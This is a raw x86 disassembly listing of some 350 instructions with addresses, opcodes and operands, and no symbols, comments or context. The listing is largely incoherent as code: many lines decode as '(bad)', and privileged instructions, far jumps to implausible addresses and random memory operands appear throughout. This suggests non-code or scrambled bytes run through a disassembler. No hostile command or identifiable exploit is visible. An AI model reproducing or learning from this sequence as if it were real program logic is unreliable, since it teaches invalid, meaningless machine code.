  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
